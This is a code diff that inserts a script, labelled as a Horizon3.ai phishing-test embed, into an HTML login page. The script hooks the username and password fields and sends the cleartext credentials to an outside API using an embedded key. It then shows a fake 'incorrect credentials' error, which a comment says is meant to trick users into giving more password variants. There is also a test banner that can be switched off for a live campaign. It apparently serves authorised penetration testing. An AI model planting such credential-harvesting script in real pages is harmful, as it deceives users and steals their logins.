@@ -30,7 +30,167 @@
   </form>
 </center>
 
-<!-- PASTE NODEZERO PHISHING SCRIPT HERE -->
+<script>
+  // Horizon3.ai Phishing JavaScript Embed Code
+  // Update the following variables to true or false based on your needs
+  const testModeEnabled = true // Set to false to hide test banner
+  const showIncorrectCredentialsError = true // Set to false if you do not want "Incorrect Login Credentials. Enter your sign in information again." to appear after a user submits their password. This is used to trick the user into trying another password variation
+  const pentestId = '682cb497-d310-446f-8342-9f577c2b730f'
+  const phisherKey = 'MTo0MWI2NzYzNi1jYzI2LTRjYzgtYWM0OS0zYzhlY2UyMjU5OWM6dWVNTTFHbjQ0bjAvcmdscTJYSnJ5bmFMUlQvVlRhdEVLNkxWcklMQktLS1djSVRB'
+  const lowercaseUsernameTerms = ['email', 'username', 'uname', 'user']
+  const lowercasePasswordTerms = ['password']
+  const lowercaseSubmitTerms = ['submit', 'sign in', 'log in']
+  const credentials = {
+    username: '',
+    password: '',
+  }
+  let userNameInputExists = false
+  let passwordInputExists = false
+  let submitExists = false
+  let token = ''
+
+  if (!token) {
+    fetch('https://api.horizon3ai.com/v1/auth', {
+      method: 'POST',
+      headers: { 'content-type': 'application/json' },
+      body: JSON.stringify({ key: phisherKey }),
+    })
+      .then(response => response.json())
+      .then(response => (token = response.token))
+      .catch(err => console.log(err))
+  }
+
+  const formValidationError = document.createElement('p')
+  const testBanner = document.createElement('div')
+  const testCredentials = document.createElement('div')
+  const generateCredentialText = () =>
+    'Credentials username=' + credentials.username + ' password=' + credentials.password
+
+  testBanner.style =
+    'position: absolute; top: 0; left: 0; width: 100%; opacity: 0.9; z-index:9999; padding: 30px; background: #9E0325; color: white; font-size: 16px; font-weight: bold; text-align: center;'
+  testBanner.textContent =
+    'Horizon3.ai phishing test mode enabled. Disable test mode in the javascript before beginning your phishing campaign.'
+  testCredentials.style = 'color: white; font-size: 16px; margin: 5px 0 5px 0;'
+  testCredentials.textContent = generateCredentialText()
+  formValidationError.style = 'color: #9E0325; font-size: 14px;'
+  formValidationError.textContent = 'Incorrect Login Credentials. Enter your sign in information again.'
+
+  const usernameHandler = e => {
+    credentials.username = e.target.value
+    if (testModeEnabled) {
+      testCredentials.textContent = generateCredentialText()
+    }
+  }
+
+  const passwordHandler = e => {
+    credentials.password = e.target.value
+    if (testModeEnabled) {
+      testCredentials.textContent = generateCredentialText()
+    }
+  }
+
+  const sendCreds = () => {
+    if (credentials.username && credentials.password) {
+      fetch('https://api.horizon3ai.com/v1/graphql', {
+        headers: { 'content-type': 'application/json', 'Authorization': token },
+        method: 'POST',
+        body: JSON.stringify({
+          query: 'mutation inject_phish { inject_phish(op_id: "' + pentestId + '", potential_credentials: [{ key_type:"cleartext", user: "' + credentials.username + '", cleartext: "' + credentials.password + '" }], is_test_mode: ' + testModeEnabled + ') { message }}'
+        }),
+      })
+        .then(response => response.json())
+        .then(json => {
+          if (testModeEnabled && credentials.username && credentials.password && json.data.inject_phish.message === 'Test succeeded.') {
+            testBanner.style =
+              'position: absolute; top: 0; left: 0; width: 100%; opacity: 0.9; z-index:9999; padding: 30px; background: green; color: white; font-size: 16px; font-weight: bold; text-align: center;'
+            const testSuccessful = document.createElement('div')
+            testSuccessful.textContent = 'Credentials successfully captured. Disable test mode when ready to begin phishing campaign.'
+            testBanner.appendChild(testSuccessful)
+          } else if (testModeEnabled && !credentials.username || !credentials.password) {
+            const testFailed = document.createElement('div')
+            testFailed.textContent = 'Error capturing credentials. Troubleshoot the inputs for username, password and submit on the login page or contact support.'
+            testBanner.appendChild(testFailed)
+          }
+        })
+        .catch(err => console.log(err))
+
+      if (showIncorrectCredentialsError) {
+        const submitButton = document.querySelector('.h3-submit')
+        submitButton.parentNode.insertBefore(formValidationError, submitButton)
+      }
+    }
+  }
+
+  const submitHandler = e => {
+    console.log('Running Submit Handler')
+    e.preventDefault()
+    console.log('Clicked on:', event.target);
+    const attributeNames = event.target.getAttributeNames()
+    const attributeValues = attributeNames.map(name => event.target.getAttribute(name).toLowerCase())
+    console.log(attributeNames)
+    console.log(attributeValues)
+    if (attributeValues.includes('h3-submit'))
+      console.log('Sending Creds')
+    sendCreds()
+  }
+
+  const eventhandlers = {
+    username: usernameHandler,
+    password: passwordHandler,
+    submit: submitHandler,
+  }
+
+  const setHandlers = () => {
+    const inputs = document.querySelectorAll('input')
+    const buttons = document.querySelectorAll('button')
+    const body = document.querySelector('body')
+
+    inputs.forEach(input => {
+      const attributeNames = input.getAttributeNames()
+      const attributeValues = attributeNames.map(name => input.getAttribute(name).toLowerCase())
+      const isUsername = lowercaseUsernameTerms.some(term => attributeValues.join('|').includes(term))
+      const isPassword = lowercasePasswordTerms.some(term => attributeValues.join('|').includes(term))
+      const isSubmit = lowercaseSubmitTerms.some(term => attributeValues.join('|').includes(term))
+
+      if (isUsername) {
+        input.addEventListener('input', usernameHandler, true)
+      }
+
+      if (isPassword) {
+        input.addEventListener('input', passwordHandler, true)
+      }
+
+      if (isSubmit) {
+        submitExists = true
+        input.classList.add('h3-submit')
+        input.addEventListener('input', submitHandler, true)
+        window.addEventListener('submit', submitHandler, true)
+        document.addEventListener('click', submitHandler, true)
+      }
+
+    })
+
+    buttons.forEach(button => {
+      const attributeNames = button.getAttributeNames()
+      const attributeValues = attributeNames.map(name => button.getAttribute(name).toLowerCase())
+      const isSubmit = lowercaseSubmitTerms.some(term => attributeValues.join('|').includes(term))
+
+      if (isSubmit) {
+        button.classList.add('h3-submit')
+        button.addEventListener('click', submitHandler, true)
+      }
+    })
+
+    if (testModeEnabled) {
+      body.appendChild(testBanner)
+      testBanner.appendChild(testCredentials)
+    }
+  }
+
+  setInterval(() => {
+    setHandlers()
+  }, 500)     
+</script>
 
 </body>
 </html>
